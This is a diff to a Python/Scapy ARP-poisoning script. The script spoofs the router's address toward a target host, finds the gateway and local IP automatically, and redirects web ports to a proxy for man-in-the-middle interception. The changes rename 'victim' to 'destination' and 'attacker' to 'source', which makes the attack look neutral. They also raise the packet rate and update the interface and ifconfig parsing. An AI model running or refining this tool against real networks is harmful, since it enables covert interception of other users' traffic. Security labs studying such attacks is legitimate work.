@@ -26,11 +26,11 @@ if user != "root":
 
 # Load the args
 parser = argparse.ArgumentParser()
-parser.add_argument('--victim', required=True, help="victim IP")
+parser.add_argument('--destination', required=True, help="destination IP")
 parser.add_argument('--router', default=None)
-parser.add_argument('--iface', default='eth1')
+parser.add_argument('--iface', default='wlp6s0')
 parser.add_argument('--fwconf', type=bool, default=True, help="Try to auto configure firewall")
-parser.add_argument('--freq', type=float, default=5.0, help="frequency to send packets, in seconds")
+parser.add_argument('--freq', type=float, default=1.0, help="frequency to send packets, in seconds")
 parser.add_argument('--ports', default="80,443", help="comma seperated list of ports to forward to proxy")
 parser.add_argument('--proxy', default=None)
 parser.add_argument('--verbose', type=bool, default=True)
@@ -42,7 +42,7 @@ args = parser.parse_args()
 # Functions
 #####################################
 
-# Launch the attack
+# Launch the poisoning
 def arpPoison(args):
 	# Select the net interface in the args
 	conf.iface= args.iface
@@ -50,8 +50,8 @@ def arpPoison(args):
 	pkt = ARP()
 	# Set the router IP as source of the package
 	pkt.psrc = args.router
-	# Set the victime as dest
-	pkt.pdst = args.victim
+	# Set the destinatione as dest
+	pkt.pdst = args.destination
 	
 	# This try is here to be able to stop the while
 	try:
@@ -77,7 +77,7 @@ def getDefRoute(args):
 	for line in data:
 		# If the current line start with this, and match the if of the args
 		if line.startswith("0.0.0.0") and (args.iface in line):
-			print "Setting route to the default: " + line.split("\t")[1]
+			print "Setting route to the default: " + line.split()[1]
 			# Save the IP adress of the Gateway in the args
 			args.router = line.split()[1]
 			# Exit point !
@@ -90,15 +90,16 @@ def getDefRoute(args):
 #####################################
 
 
-# Basically the same function as above, but for the IP of the attacker
+# Basically the same function as above, but for the IP of the source 
 # get this info from the ifconfig
 def getDefIP(args):
 	data = os.popen("/sbin/ifconfig " + args.iface).readlines()
 	for line in data:
 		# / ! \
 		# This condition may not work 
-		if line.strip().startswith("inet addr"):
-			args.proxy = line.split(":")[1].split()[0]
+		if line.strip().startswith("inet "):
+			print line
+			args.proxy = line.split()[1].split()[0]
 			print "setting proxy to: " + args.proxy
 			return
 	print "Error: unable to find default IP"
